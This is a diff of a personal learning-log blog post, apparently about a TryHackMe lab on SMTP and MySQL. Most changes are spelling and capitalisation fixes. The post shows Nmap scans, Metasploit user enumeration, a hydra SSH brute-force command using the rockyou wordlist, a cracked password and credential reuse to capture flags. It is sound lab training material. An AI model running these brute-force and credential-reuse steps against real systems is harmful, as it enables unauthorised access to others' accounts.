@@ -7,12 +7,12 @@ tags: daily
 
 {{ page.date.toDateString }}
 
-I'm getting an early jump on doing this today. Hopefully I can finish the whole module.
+I'm getting a jump on doing this today. Hopefully I can finish the whole module.
 
-For task 2 for SMTP were going to use metasploit to enumerate the users available on the server using the [smtp_version](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/smtp/smtp_version.md). Its my first time using metasploit in THM so it should be interesting.
+For task 2 for SMTP were going to use Metasploit to enumerate the users available on the server using the [smtp_version](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/smtp/smtp_version.md). Its my first time using Metasploit in THM so it should be interesting.
 
 
-First I ran my nmap scan:
+First I ran my Nmap scan:
 >`nmap -sS <ip> -p 1-10000`
 >
 >`Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-30 12:55 BST`
@@ -33,7 +33,7 @@ First I ran my nmap scan:
 >
 >`Nmap done: 1 IP address (1 host up) scanned in 5.32 seconds`
 
-The I ran the following commands in metasploit:
+The I ran the following commands in Metasploit:
 
 >`msfconsole`
 >
@@ -69,11 +69,11 @@ The I ran the following commands in metasploit:
 >
 >`[*] Auxiliary module execution completed`
 
-So now we know we have a user name: `administrator` on the system and we are going to use [hydra](https://www.kali.org/tools/hydra/) to brute force it.
+Now we know we have a user name: `administrator` on the system and we are going to use [hydra](https://www.kali.org/tools/hydra/) to brute force it.
 
-So I ran:
+I ran:
 
->'hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.221.111 ssh`
+>`hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.221.111 ssh`
 
 Then I ssh'ed in and got the flag!
 
@@ -85,7 +85,7 @@ MySQL uses a client server model and can run on Linux and Windows.
 
 First in the exercise it gives us the credentials `root:password`.
 
-I run my nmap scan:
+I run my Nmap scan:
 >`nmap -sS <ip> -p 1-10000`
 >
 >`Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-30 13:30 BST`
@@ -104,10 +104,10 @@ I run my nmap scan:
 >
 >`Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds`
 
-I verified that I could connect to to mysql using the client:
+I verified that I could connect to MySQL using the client:
 >`mysql -h <ip> -u root -p`
 
-Then I moved into metasploit:
+Then I moved into Metasploit:
 >`msfconsle`
 >
 >`search mysql_sql`
@@ -135,9 +135,9 @@ and got: `doggie           (carl)`
 
 I then reused those credentials for ssh and was able to get the final flag.
 
-This module was great just like the first one. I got exposure to a lot of tools and started to get the basics of metasploit down. I think metasploit is kind of looked down upon because it it kind of a crutch and does a lot of work for you without understanding what is going on. For now though Its helpful to use.
+This module was great just like the first one. I got exposure to a lot of tools and started to get the basics of Metasploit down. I think Metasploit is kind of looked down upon because it kind of a crutch and does a lot of work for you without understanding what is going on. For now though Its helpful to use.
 
-I think one of the big things I learned from these is that an attack path usually invovles some pivots. You may exploit some service that gives you some info that you use with another service, which leads you to more info and maybe the ability to finally gain a shell.
+I think one of the big things I learned from these is that an attack path involves pivots from one service to another. You may exploit some service that gives you some info that you use with another service, which leads you to more info and maybe the ability to gain a shell.
 
 Here a couple extra links for more reading:
 [VPN exploits](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)
